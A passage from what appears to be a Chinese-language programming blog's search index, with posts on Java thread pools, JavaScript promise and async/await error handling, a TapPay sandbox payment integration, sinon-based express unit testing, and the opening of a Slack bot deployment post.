能讓我們客製化定義不同的使用模式以下為 ThreadPoolExecutor 的設定即使用方法以及取用 Queue Size 以及 Thread Name 的方式 1234567891011121314151617ThreadPoolExecutor executor = new ThreadPoolExecutor( int corePoolSize, int maxPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler);System.out.println(\"Queue size is: \" + executor.getQueue().size());executor.execute(new Runnable() { public void run() { System.out.println(\"running\"); System.out.println(\"Thread Name: \" + Thread.currentThread().getName()) }}) corePoolSize 核心 Thread 的數量，基本上 Thread 數量不會低於此數字 maxPoolSize Thread Pool 的最大數量，如果所有 Thread 都被執行的話 Task 會被塞到 Queue 之中等到有空閒的 Thread 為止 決定 maxPoolSize 的數量最好是根據系統資源去計算出來 Runtime.getRuntime().availableProcessors(); keeyAliveTime 當閒置時間超過此設定的時間的話，系統會開始回收 corePoolSize 以上多餘的 Thread unit keepAliveTime 的時間單位，可以使用 TimeUnit.SECONDS workQueue 決定當所有 Thread 都被執行時，Task 在 Queue 之中會以何種形式等待 handler Queue 已滿且 Thread 已達到 maxPoolSize 之後會以什麼樣的方式處理新的 Task BlockingQueue 詳細介紹基本規則為 如果當前的 Thread 小於 corePoolSize，則 Executor 首先會新增 Thread，而不會把 Task 丟到 Queue 之中 (基本上就是直接運行的意思) 如果當前的 Thread 大於等於 corePoolSize，則 Executor 首先會把 Task 加到 Queue 之中等待 當 Task 無法再被加入到 Queue 之中的話，則 Executor 首先會創建新的 Thread，直到超過 maxPoolSize 為止 超過 maxPoolSize 時，任務會被拒絕 BlockingQueue 有三種類型 直接提交代表類型: synchronousQueue基本上就 Queue Size 就是 0會直接把 Task 提交給 Thread，如果不存在可用 Thread，則新建一個如果此類型有設置 maxPoolSize 的話，是有可會拒絕新的 Task所以通常使這種類型，會建議 maxPoolSize 不要做上限設定 無界隊列 (Unbounded Queue)代表類型: LinkedBlockingQueueQueue 的大小是無限制的特別注意的是因為大小是無限制，所以萬一 Task 執行時間過長會導致有大量個 Task 卡在 Queue 之中動彈不得，進而導致 OOM 的發生Executors.newFixedThreadPool 採用的就是此種類型的 Queue 有界隊列 (Bounded Queue)代表類型: ArrayBlockingQueueQueue 的大小是有限制的但要注意的點是，這個 Queue 大小必須和 Thread Pool 相互搭配才可以發揮出比較好的效能使用大的 Queue Size 和小的 Thread Pool Size雖然可以有效降低 CPU 使用率，但會降低 QPS而使用小的 Queue Size 和大的 Thread Pool Size雖然可以提昇 QPS，但會降低 CPU Queue 飽和 RejectExecutionHandle 介紹再來要介紹當 Queue 飽和之後，可以根據不同 handle 做出不一樣的行為以下總計有四種使用方式 終止策略 (AbortPolicy)此為預設 Policy使用該 Policy，飽和時會拋出 RejectedExecutionException調用者可以用以下自行定義方式處理異常 12345678executor.setRejectedExecutionHandler(new RejectedExecutionHandler() { @Override public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) { System.out.println(\"Get you!\"); r.run(); System.out.println(\"Done in handler\"); }}); 拋棄策略 (DiscardPolicy)不做任何處理直接拋棄 拋棄舊任務策略 (DiscardOldestPolicy)把 Queue 之中最頭的元素拋棄，並在嘗試重新提交 Task 調用者運行策略 (CallerRunsPolicy)\b\b簡單來說，飽和後會直接由調用 Thread Pool 的主 Thread 自己來執行這個 Task但在這個期間，主 Thread 就無法再度提交 Task從而讓 Thread Pool 有時間把正在處理的 Task 給完成 創建 Thread Pool 的四個常用方法這四個常用的方法都是透過 ThreadPoolExecutor 的不同參數所實作而成的 public static ExecutorService newFixedThreadPool(int nThreads) 創建固定數量的 Thead，提交 Task 的時候如果未達 nThreads 的數量的話，則會一直新建 Thread 達到 nThreads 時，之後的 Task 則會進入到佇列中 12345public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());} public static ExecutorService newCachedThreadPool() Thread 的數量預設上限為 2^31 - 1，如果當 Thread 大於 Tasks 數量的時候 就會開始去回收那些等了超過 60 秒還沒有 Task 進來的 Thread 問題是，這個 newCachedThreadPool 是屬於動態新建所以萬一 Task 一直大於 Thread 數量的話則會一直新建 這樣很容易耗光機器資源，使用這個最好的狀況是 Task 的執行時間是短的才比較適合 12345public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());} public static ExecutorService newSingleThreadExecutor() 創建一個 Single Thread，因為此 Thread 被使用的話其他都會是在佇列中等待，所以效能會下降 1234public static ScheduledExecutorService newSingleThreadScheduledExecutor() { return new DelegatedScheduledExecutorService (new ScheduledThreadPoolExecutor(1));} public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) 支持定時以及週期性執行 Task 的需求 123public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize);} 看看 Parent Class 1234public ScheduledThreadPoolExecutor(int corePoolSize) { super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS, new DelayedWorkQueue());} 但是基本上不是很推薦使用以上這四種方法去定義 Thread Pool在阿里巴巴的 Java 開發手冊中也有提到，如果要新建 Thread請透過 ThreadPoolExecutor 的方式去自定義 Thread Pool 的使用模式在這篇文章的樓主也是因為用了以上其中一個方法採到 OOM 的雷所以在設定 Thread Pool 的時候要特別注意使用的情況適不適合！ References Java Executor并发框架 一次Java线程池误用引发的血案和总结 如何使用ThreadPool 并发新特性—Executor 框架与线程池 Java ThreadPoolExecutor and BlockingQueue Example","link":"/2019/02/19/java-executor/"},{"title":"callback, promise, async/await 使用方式教學以及介紹 Part II (Error Handling 介紹)","text":"上一篇主要是介紹如何使用這篇會介紹該如何去在每一種使用方式之中去做 Error Handling callback相信各位有在使用別人第三方套件或是 Node.js 原生的 Library 都會發現一件事情那就是 callback 第一個參數都會是 error雖然這看似是一個不成文的規定，但仔細想想把 error 放在第一個是非常合理的假設當 callback 參數回傳越來越多的時候，總不可能把 error 放在最後一個去處理因為你會始終不知道哪一個會是 error \b\b\b\b\b(就算寫註解也會讀到瘋掉)試想一下這幾段 code 就可以理解了 123456789101112131415function test(cb) { // 當 function 成功後 cb(successful_data_1, successful_data_2)}test((successful_data_1, successful_data_2) =&gt; { // \b開心地處理兩個回傳的資料})// --- 分隔線 function test(cb) { // 當 function 失敗後 cb(error)}test((error) =&gt; { // \b咦? 第一個到底是 error 還是我原本的 successful_data_1}) 當遇到上面的狀況就會變得非常難判斷，但如果我整體改寫成這樣就會變得輕而易舉 12345678910111213141516171819function test(cb) { // 當 function 成功後 cb(null, successful_data_1, successful_data_2)}test((error, successful_data_1, successful_data_2) =&gt; { if (error != null) { } // \b開心地處理兩個回傳的資料})// --- 分隔線 function test(cb) { // 當 function 失敗後 cb(error)}test((error, successful_data_1, successful_data_2) =&gt; { if (error != null) { // 開心地處理 error, 於是 data_1 以及 data_2 就完全不用管他們了 }}) 當然有人會說『啊我就把所有參數丟到第一個當 Object 全部存起來，第二個就放 Error 也是一種方式啊』這樣講的話當然沒錯，但如果把所有東西都放在第一個 Object 裡面這樣參數就會有分類，使用問題也只是會徒增而已再加上這算是一種共識了，所以跟潛規則走會比較方便一點 promisePromise 處理 error 的方式就比較特別了，我們先來看看一般 promise 出錯的時候是怎麼抓取的 123456function test() { return new Promise((res, rej) =&gt; { rej(\"this is error\"); })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // this is error 上面為一般 promise 用 rej 的方式，外面用 catch 去抓住這個錯誤但凡事要考慮例外，萬一有一個 error 是你沒辦法 rej 到的話，那該要怎麼抓取? 123456function test() { return new Promise((res, rej) =&gt; { oqiwje() // non-exist function })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // this is error 會發現當在 Promise 裡面出錯的話，外面的 catch 也是能抓到的其原因是因為 Promise 是有被一層內部的 try-catch 給包住且在內部的 catch 那一邊套用了預設地 rej function所以外面才抓得到 那如果放在 Promise 外面的話呢?? 123456function test() { oqiwje() // non-exist function return new Promise((res, rej) =&gt; { })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); 咦!? 竟然抓不到，error 直接噴出來!但這也不意外，因為出了 Promise 到了外面那就是要透過自己去寫 try-catch 才能抓取到這個錯誤 12345678910function test() { oqiwje() // non-exist function return new Promise((res, rej) =&gt; { })}try { test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)});} catch (error) { console.log(\"handled by outer try-catch\");} 還有一種 Handle 方式是寫在內層 function 裡面 123456function test() { return new Promise((res, rej) =&gt; { oqiwje() // non-exist function }).catch(error =&gt; \"handle by inner function\")}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // Get handle by inner function 那因為在 inner function 裡面被抓取到，並且回傳還記得 promise chain 中，如果 return 的話是會到下一個 then 去的所以這邊會被外面的 then 給抓到，而不是 catch，這邊要注意 Promise 的 Error Handling 只要能確保能執行到 rej 就沒什麼問題了然而在 Promise 之前用 try-catch 包起來或程式都丟到 Promise 裡面等他報錯丟出來也可以處理到 async/awaitawait catch error 的方式可以想成一般 try-catch 的方式 12345678910111213function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test() } catch (error) { console.log(\"Handled by main\") }}main() 而要特別注意的是，如果把 catch 寫在外面的 await 那裡的話會造成程式不會往最外層的 catch 前進 123456789101112131415function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; {console.log(\"Handled by await\")}) // 因為有正確被 handle 到，所以程式是會繼續下去執行的 console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 但如果透過在 catch function 裡面把 error 再次 throw 出來的話，是可以成功 throw 出來 123456789101112131415161718function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; { console.log(\"Handled by await\") throw new Error(\"QQQQ\") }) // 因為在上面做 throw error，所以程式不會繼續走下去 console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 千萬要注意 return 和 throw 的方式會帶來不一樣的結果使用 return 就跟 Promise 的 reject 的狀態下 return 是一樣的他會回傳到下一個 then 裡面 (也就是 resolved 的狀態) 12345678910111213141516171819function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; { console.log(\"Handled by await\") return new Error(\"QQQQ\") }) // 因為在上面做 return, 相當於是把結果回傳到 result 裡面了 console.log(result); // Error: QQQQ console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 而個人比較不建議的寫法是在 await 那一層做 Error Handling而是盡量再底層那裡做 throw error 到最外面的 try-catch 去接原因是這跟 Design Pattern 有關係最外層的 main 可以想像是 Controller，而 test 可以想像成 Facade在裡面得程式才是真正的商業邏輯從下面程式來解讀的話，回家主要目的是要做功課那做功課一定會有流程，像是先吃飯，洗澡，最後在讀書這樣的順序但要怎麼吃飯洗澡讀書是要寫在每一個該做的項目的最裡面，而不會寫在順序那一層這樣程式撰寫上會比較乾淨一點 12345678910111213141516171819202122232425262728293031323334function eatFirst() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { res(\"Error\"); }, 1000); });}function getBook() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { res(\"Error\"); }, 1000); });}function writeIt() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { rej(\"Books are ate by dogs!!!\"); }, 1000); });}async function doHomeWork() { await eatFirst() await getBook() await writeIt()}async function main() { try { let result = await doHomeWork(); } catch (error) { console.log(\"Handled by main\") }}main(); 後記這次主要介紹 Error Handling 的方式也加了一些個人建議撰寫的方法，如果有其他想法歡迎大家來討論！","link":"/2019/05/02/promise-2/"},{"title":"如何串接上 TapPay 並完成第一筆交易!","text":"這篇文章主要是說明如何使用 TapPay 這個服務TapPay 是一家金流廠商，主要都是做線上金流，詳細就不多說有興趣想要詳細了解可以去參考官網 https://www.tappaysdk.com 最近剛好被派去串接 TapPay 的服務，就順便把整個流程給記錄下來了這邊會以 Web 服務為主去做範例，完整程式碼，請參考最下面 環境設置 TapPay Portal 申請 要拿到以下的值才有辦法作後續的付款 App Key (應用程式頁面) App ID (應用程式頁面) Partner Key (帳號資訊頁面) Merchant ID (商家管理頁面) 程式部分 前端: HTML + Javascript + CSS 後端: nodejs (v6) 網域部分 設置 /etc/hosts這邊要特別注意，要去 /etc/hots 底下設置跟在 TapPay Portal 所建立的 domain 一樣才有辦法 Get Prim，否則會一直出現 CORS 的問題待會在細部流程的時候會做介紹 測試卡號 測試卡號可以參考這裡 https://docs.tappaysdk.com/tutorial/zh/reference.html#test-card card number 4242424242424242 month 01 year 23 ccv 123 流程介紹主要分成以下幾個步驟 前端 使用 TapPay SDK 設置好輸入卡號的表單 按下按鈕觸發 TapPay 的 GetPrime 方法 拿到 Prime 把 Prime 送到後端 後端 拿到前端送來的 Prime 把 Prime 加上其他所需參數送往 TapPay Server 完成付款! 程式撰寫 - 前端根據最新的 SDK 發佈的方法, 可以直接在一個 element 底下把卡號輸入表單塞進去 HTMLHTML 分成兩個部分 建立好一個 div 準備等等被塞入輸入卡號表單 建立好 trigger button 來觸發 Get Prime 方法 123456789&lt;div style=\"width: 480px; margin: 50px auto;\"&gt; &lt;label&gt;CardView&lt;/label&gt; &lt;!-- 這是我們要塞表單的地方 --&gt; &lt;div id=\"cardview-container\"&gt;&lt;/div&gt; &lt;!-- 這是我們要觸發 GetPrime 方法的地方 --&gt; &lt;button id=\"submit-button\" onclick=\"onClick()\"&gt;Get Prime&lt;/button&gt;&lt;/div&gt; JavascriptJavascript 分成三個部分 初始化金鑰 植入輸入卡號表單 觸發 getPrime 方法 12345678910111213141516171819// 設置好等等 GetPrime 所需要的金鑰TPDirect.setupSDK(APP_ID, \"APP_KEY\", \"sandbox\") // 把 TapPay 內建輸入卡號的表單給植入到 div 中TPDirect.card.setup('#cardview-container')var submitButton = document.querySelector('#submit-button')function onClick() { // 讓 button click 之後觸發 getPrime 方法 TPDirect.card.getPrime(function (result) { if (result.status !== 0) { console.err('getPrime 錯誤') return } var prime = result.card.prime alert('getPrime 成功: ' + prime) })} 沒錯！你沒看錯，不到 30 行但是，這邊要注意到一個地方，如果你 Get Prime 之後沒有任何反應打開開發者模式後卻看到了這個getPrime 錯誤題外話，如果並不使用 TPDirect.card.setup 版本的話而是自己實作整個流程，則會看到 CORS 的紅字 這個代表你開發的網域和你在 TapPay Portal 上面所填寫的網域是不一樣的這就是一開始在環境設置提到的 /etc/hosts 有關係 假設你未來可能要使用的網域是 example-tappay.yujack.com 的話請到 /etc/hosts localhost 下面加上一段 12127.0.0.1 localhost127.0.0.1 example-tappay.yujack.com 然後回到網頁上把 URL 從http://localhost:8080/ 改成 http://example-tappay.yujack.com:8080/這樣 Get Prime 就會成功了！ 不過要注意，如果你未來要用的網域是已經在用的話在 /etc/hosts 底下是上去是沒有用的所以切記用一個沒在用的網域做測試否則 .. 你只好直接部署上去測試了 程式撰寫 - 後端小弟我是習慣用 nodejs 撰寫後端伺服器所以這邊會以 nodejs 去做付款的動作前端 Get Prime 成功之後, 就要把這組 prime 送到後端了 建立 NodeJs server12345678910111213141516171819const express = require('express')const app = express()const bodyParser = require('body-parser')const https = require('https');const PORT = 8080app.use(bodyParser.json())app.use(bodyParser.urlencoded({ extended: false}))app.use('/', express.static(__dirname + \"/html\")) //serve static contentapp.post('/pay-by-prime', (req, res, next) =&gt; { // 必須要把程式實作在這邊})app.listen(PORT, () =&gt; { console.log('Connet your webiste in the http://localhost:8080/');}) 實作 Pay by Prime接下來要實作 pay-by-prime 的程式要加到 app.post(‘/pay-by-prime’) 裡面這裡有兩個參數要注意兩個都是在 TapPay Portal 上面申請帳號時會獲得的，程式如下 Partner Key (帳號資訊頁面) Merchant ID (商家管理頁面) 另外就是 headers 裡面要特別帶 x-api-key 進去否則會收到 access deny 的 response 可以參考 https://docs.tappaysdk.com/tutorial/zh/back.html#pay-by-prime-api所需要帶的參數和 headers 12345678910111213141516171819202122232425262728293031323334353637383940const post_data = { // prime from front-end \"prime\": req.body.prime, \"partner_key\": \"PARTNER_KEY\", \"merchant_id\": \"MERCHANT_ID\", \"amount\": 1, \"currency\": \"TWD\", \"details\": \"An apple and a pen.\", \"cardholder\": { \"phone_number\": \"+886923456789\", \"name\": \"yujack\", \"email\": \"example@gmail.com\" }, \"instalment\": 0, \"remember\": false}const post_options = { host: 'sandbox.tappaysdk.com', port: 443, path: '/tpc/payment/pay-by-prime', method: 'POST', headers: { 'Content-Type': 'application/json', // 這個參數必須要帶上去，否則不會過 'x-api-key': 'PARTNER_KEY' }}const post_req = https.request(post_options, function(response) { response.setEncoding('utf8'); response.on('data', function (body) { return res.json({ result: JSON.parse(body) }) });});post_req.write(JSON.stringify(post_data));post_req.end(); 實作完成後，開啟 nodejs server然後打上測試卡後就可以完成付款了！打完收工！下班去！ 前端補正記得前端要補上把 prime 帶上來的程式123$.post('/pay-by-prime', {prime: prime}, function(data) { alert('付款成功' + JSON.stringify(data))}) 完整程式碼資料夾結構12345||--- app.js||----html| |---index.html 前端1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;script text=\"text/javascript\" src=\"https://js.tappaysdk.com/tpdirect/v2_2_1\"&gt;&lt;/script&gt; &lt;script src=\"https://code.jquery.com/jquery-2.2.4.min.js\"&gt;&lt;/script&gt; &lt;title&gt;Connect payment with TapPay&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"width: 480px; margin: 50px auto;\"&gt; &lt;label&gt;CardView&lt;/label&gt; &lt;div id=\"cardview-container\"&gt;&lt;/div&gt; &lt;button id=\"submit-button\" onclick=\"onClick()\"&gt;Get Prime&lt;/button&gt; &lt;pre id=\"result1\"&gt;&lt;/pre&gt; &lt;pre id=\"result2\"&gt;&lt;/pre&gt; &lt;/div&gt; &lt;script&gt; TPDirect.setupSDK(APP_ID, 'APP_KEY', 'sandbox') TPDirect.card.setup('#cardview-container') var submitButton = document.querySelector('#submit-button') var cardViewContainer = document.querySelector('#cardview-container') function onClick() { TPDirect.card.getPrime(function (result) { if (result.status !== 0) { console.log('getPrime 錯誤') return } alert('getPrime 成功') var prime = result.card.prime document.querySelector('#result1').innerHTML = JSON.stringify(result, null, 4) $.post('/pay-by-prime', {prime: prime}, function(data) { alert('付款成功') document.querySelector('#result2').innerHTML = JSON.stringify(data, null, 4) }) }) } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 後端記得先執行以下 command1npm install body-parser express 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const express = require('express')const app = express()const bodyParser = require('body-parser')const https = require('https');const PORT = 8080app.use(bodyParser.json())app.use(bodyParser.urlencoded({ extended: false}))app.use('/', express.static(__dirname + \"/html\")) //serve static contentapp.post('/pay-by-prime', (req, res, next) =&gt; { const post_data = { \"prime\": req.body.prime, \"partner_key\": \"PARTNER_KEY\", \"merchant_id\": \"MERCHANT_ID\", \"amount\": 1, \"currency\": \"TWD\", \"details\": \"An apple and a pen.\", \"cardholder\": { \"phone_number\": \"+886923456789\", \"name\": \"jack\", \"email\": \"example@gmail.com\" }, \"remember\": false } const post_options = { host: 'sandbox.tappaysdk.com', port: 443, path: '/tpc/payment/pay-by-prime', method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': 'PARTNER_KEY' } } const post_req = https.request(post_options, function(response) { response.setEncoding('utf8'); response.on('data', function (body) { return res.json({ result: JSON.parse(body) }) }); }); post_req.write(JSON.stringify(post_data)); post_req.end();})app.listen(PORT, () =&gt; { console.log('Connet your webiste in the http://localhost:8080/');})","link":"/2017/09/23/tappay-payment/"},{"title":"express unit test 一些技巧教學以及困難點","text":"前言上一篇我們講到使用 sinon 搭配 express 的使用基礎今天會介紹的是關於在 nodejs 的 express unit test實作 unit test 的幾個技巧以及可能會遇到的問題該如何解決問題，並依靠 sinon 去達到希望的功效 stub 同一個 object在開始寫 unit test 之後會開始發現一件事情，就是需要對同一個物件重複做 stub在 a.test.js 需要 stub 一次在 b.test.js 又需要 stub 一次 直覺上測試程式可能會變成以下的樣子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// login.test.jsconst apiServiceStub = sinon.stub(apiService);describe(\"[登入功能]\", () =&gt; { it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.login.withArgs(\"123\").resolves({ status: 0 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.login.withArgs(\"123\").resolves({ status: -1 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })})// register.test.jsconst apiServiceStub = sinon.stub(apiService);describe(\"[註冊功能]\", () =&gt; { it(\"註冊成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.register.withArgs(\"123\").resolves({ status: 0 }); await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊成功\", }); sinon.assert.calledOnce(res.json); }) it(\"註冊錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.register.withArgs(\"123\").resolves({ status: -1 }); await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊失敗\", }); sinon.assert.calledOnce(res.json); })}) 我們在 login.test.js 以及 register.test.js都對 apiServer 進行 stub 的動作而這兩個檔案在獨立分別跑測試的時候是會成功的但一起執行的時候卻會爆出以下的錯誤TypeError: Attempted to wrap which is already wrapped代表說，我們對同一個 object 重複做了 wrap 可到個人的 github 下載程式，並執行 npm run w1就可以看到錯誤訊息了 要解決這個問題的話我們必須透過 stub 指定的 method再加上透過 restore 的方式釋放被 wrapped 物件的方法如果不 restore 的話，物件就會一直是 wrappred 的狀態然後就一直沒有辦法回復到原本物件應該有的狀態所以更改過後程式碼如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// login.test.jslet apiServiceLogindescribe(\"[登入功能]\", () =&gt; { before(() =&gt; { apiServiceLogin = sinon.stub(apiService, \"login\"); }) after(() =&gt; { apiServiceLogin.restore(); }) it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 0 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: -1 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })})// register.test.jslet apiServiceRegisterStub;describe(\"[註冊功能]\", () =&gt; { before(() =&gt; { apiServiceRegisterStub = sinon.stub(apiService, \"register\"); }) after(() =&gt; { apiServiceRegisterStub.restore(); }) it(\"註冊成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceRegisterStub.withArgs(\"123\").resolves({ status: 0 }) await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊成功\", }); sinon.assert.calledOnce(res.json); }) it(\"註冊錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceRegisterStub.withArgs(\"123\").resolves({ status: -1 }) await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊失敗\", }); sinon.assert.calledOnce(res.json); })}) 主要著手解決的地方在於兩點 before -&gt; 把 stub 的地方改放這 (不過個人實驗過，不放這也沒問題，放這只是比較有統一性) after -&gt; 加上 restore，在做完測試的時候把整個物件給釋放出來這點如果沒有做到的話，會導致在另一個 xxx.test.js 在使用同一個物件的方法時爆出已經被 wrapped 過後的錯誤訊息 可在個人專案下執行 npm run w2 即可看到錯誤訊息裡面的範例是把 login.test.js restore 給註解掉後故意讓 register.test.js 去對 login 做 stub 而不是 register此時因為 login.test.js 做過一次 stubregister.test.js 再做一次 stub 就會出現錯誤了成功的結果可以執行 npm run c1 看到 檢測 API URI透過 sinon.stub 的 withArgs 功能可以確定當我們程式在執行的時候，所呼叫的 api URI 是否正確123axiosPostStub.withArgs(\"http://localhost:7070/api/login\", data).resolves({ status: 0})當程式呼叫錯誤的 API URI 的時候就不會回傳我們預設給的回傳值就會導致程式後續失敗，這就是反向驗證了我們 API URI 是否正確的方式 可在個人專案下執行 npm run c2 即可看到結果 驗證 axios 的攔截器有時候我們會為 axios 加上攔截功能但如果要測試攔截功能，就又必須要有 server 才能辦到此時可以在 test case 裡面加上 http.createServer 做到這件事情12345678910111213141516171819202122232425262728293031323334// network.jsconst axios = require(\"axios\");axios.interceptors.request.use((config) =&gt; { console.log((\"do something for request\")); return config;});axios.interceptors.response.use((response) =&gt; { console.log((\"do something for response\")); return response.data;});module.exports = axios;// network.test.jslet server;describe(\"[network 功能]\", () =&gt; { afterEach(() =&gt; { server.close(); server = null; }) it(\"測試攔截功能(interceptors)\", (done) =&gt; { server = http.createServer((req, res) =&gt; { const data = {a:1} res.end(JSON.stringify(data)); }).listen(4000, () =&gt; { network.post(\"http://localhost:4000\").then((data) =&gt; { done(); }) }) })}); 配置好以上程式之後，可以在 terminal 看到兩個 console.log 的訊息這就代表我們的攔截器有被執行到個人認為攔截器測試獨立寫出來一個就可以不用特地讓其他測試案例都一定要執行到這功能，不然就不叫 unit test 了 可在個人專案下執行 npm run c3 即可看到結果 測試 callback function有些時候我們會需要把一些在用 callback function 的程式包起來改用 Promise 的方法使用，如下123456789101112131415161718const obj = { test: function(data, callback) { callback(data); }}const test = () =&gt; { return new Promise((res, rej) =&gt; { obj.test(\"qqqq\", (data) =&gt; { res(data) }) })}async function main() { let data = await test(); console.log(data);}main()// qqqq 在這種 callback 底下，可以透過 sinon.yields 去進行測試sinon.yields 的功能，就是可以強制讓你的 callback 被執行而不會去執行原本 function 內 callback 應該要執行的內容而且後面所帶的參數會變成你設定在 yields(data1, data2) 後面的 data1 data2這邊展示一個範例1234567891011const obj = { test: function(data, callback) { console.log(\"running\"); callback(data); }}obj.test(\"test\", (data) =&gt; { console.log(data);})// running// test 讓我們把程式加上 sinon.yield 試試看123456789101112const sinon = require(\"sinon\")const obj = { test: function(data, callback) { console.log(\"running\"); callback(data); }}sinon.stub(obj, \"test\").yields(1)obj.test(\"test\", (data) =&gt; { console.log(data);})// 1 程式會 log 出 1 這個值但是 running 並不會執行到非常符合 stub 的原則，就是會覆寫 function 原本的行為然後再透過 yields 的方法，可以直接你所撰寫觸發 callback 的行為而不會去執行 obj.test function 本身的行為 所以依此類推，我在後面多加幾個參數原本的 callback 回來的參數只會有一個，其餘為 undefined12345678910111213const obj = { test: function(data, callback) { callback(data); }}obj.test(\"test\", (data1, data2, data3) =&gt; { console.log(\"data1: \" + data1); console.log(\"data2: \" + data2); console.log(\"data3: \" + data3);})// data1: test// data2: undefined// data3: undefined 但是如果透過 sinon.yields 去強制給於另外兩個參數呢?123456789101112131415const sinon = require(\"sinon\")const obj = { test: function(data, callback) { callback(data); }}sinon.stub(obj, \"test\").yields(1, 2, 3)obj.test(\"test\", (data1, data2, data3) =&gt; { console.log(\"data1: \" + data1); console.log(\"data2: \" + data2); console.log(\"data3: \" + data3);})// data1: 1// data2: 2// data3: 3 callback 的時候，另外兩個參數也會跟著進來 那透過把 callback 包成 promise 的案例又該怎麼測試呢?範例如下，必須在執行 function 之前先加上 sinon.stub(obj, &quot;test&quot;).yields(1) 就可以了1234567891011121314151617181920const sinon = require(\"sinon\")const obj = { test: function(data, callback) { callback(data); }}sinon.stub(obj, \"test\").yields(1)const test = () =&gt; { return new Promise((res, rej) =&gt; { obj.test(\"qqqq\", (data) =&gt; { res(data) }) })}async function main() { let data = await test(); console.log(data);}main()// 1 (因為已經被 yields 改成 1 了) 測試涵蓋率 (test coverage)做測試的時候當然少不了 test coveragenode.js 有一款叫做 nyc 的可以檢測 test coverage配製方法非常簡單，以下兩個步驟即可 下載 nyc npm install nyc 把 nyc 放置於 mocha 前面 nyc mocha ....如果要想看 html 結構的報告的話，nyc --reporter=lcov --reporter=text-summary mocha ... 可在個人專案下執行 npm run nyc 即可看到結果 結語以上介紹幾個在實際撰寫 unit test 會遇到的困難點以及解決方法未來還有遇到的話，會在陸陸續續補上來！","link":"/2019/12/22/unit-test-express-implement-troubleshooting/"},{"title":"Slack Bot","text":"在開始玩弄 Slack Bot 之前，必須要先去申請頁面建立一個 APP 申請完之後，可以看到 Features 那邊有很多不同的功能這次主要會針對 Slash Command、Incoming Webhooks 以及 Interactive Components 做練習 在開始正式介紹之前，我們可以思考一個情境身為工程師，就是會想要降低人工干涉的事情，大量自動化那今天，我想要自動部署我的 server 的話，可以怎麼做呢? 這裡可以透過 Slash Command + Incoming Webhooks 做到，步驟如下 在 Slack 上面打上 /deploy ticket master (用 Slash Command 通知 server) Server 就會接收到需要 deploy tickey server，然後切換到 master branch 上面 pull 